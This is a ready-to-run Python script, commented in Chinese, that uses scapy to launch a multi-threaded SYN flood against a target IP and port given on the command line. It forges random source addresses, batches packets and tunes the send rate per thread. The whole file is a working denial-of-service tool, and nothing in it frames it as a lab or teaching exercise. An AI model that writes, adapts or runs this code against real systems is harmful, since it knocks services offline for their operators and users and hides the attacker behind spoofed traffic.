import sys
import threading
import time
from scapy.all import *

def syn_flood_thread(target_ip, target_port, thread_id, packets_per_second=1000):
    """
    单线程SYN Flood攻击
    """
    print(f"Thread {thread_id} starting SYN Flood on {target_ip}:{target_port}...")
    packet_count = 0
    start_time = time.time()
    
    while True:
        try:
            # 批量发送数据包以提高效率
            packets = []
            for _ in range(10):  # 每次批量发送10个包
                # 构造IP层，源IP随机伪造 (DDoS的关键特征)
                ip_layer = IP(src=RandIP(), dst=target_ip)
                # 构造TCP层，目标端口为指定端口，标志位为SYN
                tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
                # 组合成完整的数据包
                packet = ip_layer / tcp_layer
                packets.append(packet)
            
            # 批量发送数据包
            send(packets, verbose=0)
            packet_count += len(packets)
            
            # 控制发送速率
            elapsed = time.time() - start_time
            expected_packets = int(elapsed * packets_per_second)
            if packet_count > expected_packets:
                time.sleep(0.001)  # 稍微延迟
                
            # 每1000个包打印一次统计
            if packet_count % 1000 == 0:
                rate = packet_count / elapsed
                print(f"Thread {thread_id}: Sent {packet_count} packets, Rate: {rate:.1f} pps")
                
        except KeyboardInterrupt:
            print(f"Thread {thread_id} SYN Flood stopped.")
            break
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            time.sleep(0.1)

def syn_flood(target_ip, target_port, num_threads=5, packets_per_second=1000):
    """
    多线程SYN Flood攻击
    :param target_ip: 目标IP
    :param target_port: 目标端口
    :param num_threads: 线程数量
    :param packets_per_second: 每秒发包数（每线程）
    """
    print(f"Starting multi-threaded SYN Flood on {target_ip}:{target_port}...")
    print(f"Threads: {num_threads}, Rate per thread: {packets_per_second} pps")
    print(f"Total expected rate: {num_threads * packets_per_second} pps")
    
    threads = []
    try:
        # 启动多个攻击线程
        for i in range(num_threads):
            thread = threading.Thread(
                target=syn_flood_thread, 
                args=(target_ip, target_port, i+1, packets_per_second)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # 稍微错开启动时间
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
            
    except KeyboardInterrupt:
        print("Stopping all attack threads...")
        # 线程会通过daemon=True自动停止

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 attack.py <Target_IP> <Target_Port> [threads] [pps_per_thread]")
        print("Example: python3 attack.py 10.10.20.20 80 10 2000")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    victim_port = int(sys.argv[2])
    num_threads = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    pps_per_thread = int(sys.argv[4]) if len(sys.argv) > 4 else 1000
    
    syn_flood(victim_ip, victim_port, num_threads, pps_per_thread)